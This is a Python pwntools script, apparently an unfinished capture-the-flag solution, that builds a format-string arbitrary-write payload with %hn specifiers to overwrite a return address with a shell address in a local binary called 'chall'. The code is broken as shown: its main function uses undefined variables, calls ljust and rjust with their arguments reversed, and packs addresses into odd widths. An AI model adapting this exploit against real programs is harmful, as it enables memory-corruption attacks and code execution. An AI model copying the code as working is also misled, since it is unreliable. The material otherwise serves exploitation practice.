from pwn import *

def build_addresses(address, endian='little', step_size=2, bit_size=64):
  address_count = bit_size // (8 * step_size) # Calculate how many addresses are required

  addresses = []
  address_int = int.from_bytes(address, endian)
  for i in range(address_count):
    next_address_int = address_int + (i * step_size) 
    next_address = next_address_int.to_bytes(16, endian)
    addresses.append(next_address)

  return b''.join(addresses)

def build_format_string(format_location, write_value):
  '''
  Should only allow step sizes of 2 or 4??
  '''
  format_count = len(write_value) // 2

  format_string = b''
  for i in range(format_count):
    format_value = write_value[i*2:(i*2)+2]
    print(format_value)
    format_int = int.from_bytes(format_value, 'little')

    format_string += f'%{format_int}c%{format_location+i}$hn'.encode('utf-8')

  return format_string

def main():
  proc = process('./chall')

  context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
  
  #sleep(5)
  #gdb.attach(proc)

  format_string = build_format_string(format_location, shell_address).ljust(b'0', 64)
  shellcode = b''.rjust(b'0',64)
  addresses = build_addresses(rip_address).ljust(b'0', 32)
  payload = b''.join([
    b'1 ',
    format_string
  ])

  proc.sendlineafter(b'A: ', b'1')
  proc.sendlineafter(b'B: ', payload)
  print(proc.recvline())
  print(proc.recvline())
  print(proc.recvline())
  print(proc.recvline())


if __name__ == '__main__':
  #main()
  print(build_format_string(44, b'\x40\x40\x40\x40\x40\x40\x40\x40'))
